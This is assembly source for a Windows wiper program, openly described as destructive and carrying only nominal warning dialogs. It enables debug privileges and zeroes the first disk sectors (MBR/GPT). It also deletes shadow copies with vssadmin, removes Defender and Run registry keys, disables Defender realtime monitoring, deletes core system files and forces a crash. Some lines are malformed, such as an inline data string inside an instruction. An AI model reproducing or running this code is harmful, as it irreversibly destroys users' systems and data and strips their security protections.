; NASM 64-bit Windows destructive code
; HARUS dijalankan hanya di lingkungan virtual yang terkontrol!

bits 64
default rel

; Import Windows API functions
extern __imp_MessageBoxA
extern __imp_ExitProcess
extern __imp_GetCurrentProcess
extern __imp_OpenProcessToken
extern __imp_LookupPrivilegeValueA
extern __imp_AdjustTokenPrivileges
extern __imp_CreateFileA
extern __imp_WriteFile
extern __imp_CloseHandle
extern __imp_Sleep
extern __imp_DeleteFileA
extern __imp_CreateProcessA
extern __imp_WaitForSingleObject
extern __imp_RegDeleteKeyA
extern __imp_RegOpenKeyExA
extern __imp_RegCloseKey

; Define function pointers
MessageBoxA equ __imp_MessageBoxA
ExitProcess equ __imp_ExitProcess
GetCurrentProcess equ __imp_GetCurrentProcess
OpenProcessToken equ __imp_OpenProcessToken
LookupPrivilegeValueA equ __imp_LookupPrivilegeValueA
AdjustTokenPrivileges equ __imp_AdjustTokenPrivileges
CreateFileA equ __imp_CreateFileA
WriteFile equ __imp_WriteFile
CloseHandle equ __imp_CloseHandle
Sleep equ __imp_Sleep
DeleteFileA equ __imp_DeleteFileA
CreateProcessA equ __imp_CreateProcessA
WaitForSingleObject equ __imp_WaitForSingleObject
RegDeleteKeyA equ __imp_RegDeleteKeyA
RegOpenKeyExA equ __imp_RegOpenKeyExA
RegCloseKey equ __imp_RegCloseKey

; Constants
STD_OUTPUT_HANDLE equ -11
FILE_SHARE_READ equ 1
FILE_SHARE_WRITE equ 2
OPEN_EXISTING equ 3
CREATE_ALWAYS equ 2
GENERIC_WRITE equ 0x40000000
TOKEN_ADJUST_PRIVILEGES equ 0x0020
TOKEN_QUERY equ 0x0008
SE_PRIVILEGE_ENABLED equ 0x00000002
INVALID_HANDLE_VALUE equ -1
HKEY_LOCAL_MACHINE equ 0x80000002
KEY_ALL_ACCESS equ 0xF003F

section .data
    szCaption      db "SYSTEM WARNING", 0
    szMessage1     db "CRITICAL SYSTEM ALERT: Memory corruption detected.", 0xD, 0xA
                   db "Running this program may cause permanent damage.", 0xD, 0xA
                   db "Continue only in a controlled environment.", 0xD, 0xA
                   db "Do you wish to proceed?", 0
    szMessage2     db "FINAL WARNING: This will overwrite critical system areas", 0xD, 0xA
                   db "including MBR, GPT, Registry, and system files.", 0xD, 0xA
                   db "This action is IRREVERSIBLE without proper backups.", 0xD, 0xA
                   db "Are you absolutely sure you want to continue?", 0
    szError        db "Access denied. Admin privileges required.", 0
    driveName      db "\\.\PhysicalDrive0", 0
    halDll         db "C:\Windows\System32\hal.dll", 0
    ntoskrnl       db "C:\Windows\System32\ntoskrnl.exe", 0
    mbrData        times 512 db 0
    seDebugName    db "SeDebugPrivilege", 0
    vssadmin       db "vssadmin delete shadows /all /quiet", 0
    cmdPath        db "C:\Windows\System32\cmd.exe", 0
    cmdArgs        db "/c vssadmin delete shadows /all /quiet", 0
    defenderKey    db "SOFTWARE\Policies\Microsoft\Windows Defender", 0
    runKey         db "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0

section .bss
    tokenHandle    resq 1
    tkp            resb 24
    bytesWritten   resd 1
    hFile          resq 1
    pi             resb 24
    startupInfo    resb 68
    hKey           resq 1

section .text
global main
main:
    push rbp
    mov rbp, rsp
    sub rsp, 32
    
    ; Warning messages
    xor rcx, rcx
    lea rdx, [szMessage1]
    lea r8, [szCaption]
    mov r9d, 4 | 48
    call [MessageBoxA]
    cmp eax, 7
    je exit_program
    
    xor rcx, rcx
    lea rdx, [szMessage2]
    lea r8, [szCaption]
    mov r9d, 4 | 48
    call [MessageBoxA]
    cmp eax, 7
    je exit_program
    
    ; Enable privileges
    call EnablePrivileges
    
    ; Destructive actions
    call OverwriteMBR
    call DeleteShadowCopies
    call WipeRegistry
    call DisableDefender
    call DeleteSystemFiles
    
    ; Final delay and crash
    mov rcx, 5000
    call [Sleep]
    call FinalCrash
    
exit_program:
    add rsp, 32
    pop rbp
    xor rcx, rcx
    call [ExitProcess]
    ret

EnablePrivileges:
    push rbp
    mov rbp, rsp
    sub rsp, 48
    
    call [GetCurrentProcess]
    mov rcx, rax
    lea rdx, [tokenHandle]
    mov r8, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    call [OpenProcessToken]
    test rax, rax
    jz privilege_fail
    
    xor rcx, rcx
    lea rdx, [seDebugName]
    lea r8, [tkp+4]
    call [LookupPrivilegeValueA]
    test rax, rax
    jz privilege_fail
    
    mov dword [tkp], 1
    mov dword [tkp+12], SE_PRIVILEGE_ENABLED
    
    mov rcx, [tokenHandle]
    xor rdx, rdx
    lea r8, [tkp]
    xor r9, r9
    mov qword [rsp+32], 0
    mov qword [rsp+40], 0
    call [AdjustTokenPrivileges]
    
privilege_fail:
    add rsp, 48
    pop rbp
    ret

OverwriteMBR:
    push rbp
    mov rbp, rsp
    sub rsp, 48
    
    ; Overwrite first 100 sectors (MBR + GPT + Partitions)
    lea rcx, [driveName]
    mov edx, GENERIC_WRITE
    mov r8d, FILE_SHARE_READ | FILE_SHARE_WRITE
    xor r9, r9
    mov qword [rsp+32], OPEN_EXISTING
    mov qword [rsp+40], 0
    call [CreateFileA]
    cmp rax, INVALID_HANDLE_VALUE
    je mbr_fail
    
    mov [hFile], rax
    mov rbx, 100  ; Number of sectors to overwrite
    
.write_loop:
    mov rcx, [hFile]
    lea rdx, [mbrData]
    mov r8d, 512
    lea r9, [bytesWritten]
    mov qword [rsp+32], 0
    call [WriteFile]
    dec rbx
    jnz .write_loop
    
    mov rcx, [hFile]
    call [CloseHandle]
    
mbr_fail:
    add rsp, 48
    pop rbp
    ret

DeleteShadowCopies:
    push rbp
    mov rbp, rsp
    sub rsp, 96
    
    ; Create process to delete shadow copies
    lea rcx, [cmdPath]
    lea rdx, [cmdArgs]
    xor r8, r8
    xor r9, r9
    mov qword [rsp+32], 0
    mov qword [rsp+40], 0
    mov qword [rsp+48], 0
    lea rax, [startupInfo]
    mov [rsp+56], rax
    lea rax, [pi]
    mov [rsp+64], rax
    call [CreateProcessA]
    
    ; Wait for process to complete
    mov rcx, [pi]
    mov rdx, 5000
    call [WaitForSingleObject]
    
    add rsp, 96
    pop rbp
    ret

WipeRegistry:
    push rbp
    mov rbp, rsp
    sub rsp, 48
    
    ; Delete critical registry keys
    mov rcx, HKEY_LOCAL_MACHINE
    lea rdx, [defenderKey]
    xor r8, r8
    mov r9, KEY_ALL_ACCESS
    lea rax, [hKey]
    mov [rsp+32], rax
    call [RegOpenKeyExA]
    
    mov rcx, [hKey]
    call [RegDeleteKeyA]
    
    mov rcx, HKEY_LOCAL_MACHINE
    lea rdx, [runKey]
    xor r8, r8
    mov r9, KEY_ALL_ACCESS
    lea rax, [hKey]
    mov [rsp+32], rax
    call [RegOpenKeyExA]
    
    mov rcx, [hKey]
    call [RegDeleteKeyA]
    
    add rsp, 48
    pop rbp
    ret

DisableDefender:
    push rbp
    mov rbp, rsp
    sub rsp, 32
    
    ; Additional Defender disable commands
    lea rcx, [cmdPath]
    lea rdx, [db ' /c powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"', 0]
    call CreateProcessA
    
    add rsp, 32
    pop rbp
    ret

DeleteSystemFiles:
    push rbp
    mov rbp, rsp
    
    ; Delete critical system files
    lea rcx, [halDll]
    call [DeleteFileA]
    
    lea rcx, [ntoskrnl]
    call [DeleteFileA]
    
    ; Delete entire Windows directory
    lea rcx, [db 'C:\Windows\*.*', 0]
    call [DeleteFileA]
    
    pop rbp
    ret

FinalCrash:
    ; Multiple crash methods
    xor rax, rax
    mov [rax], rax
    ud2
.infinite_loop:
    jmp .infinite_loop
    ret
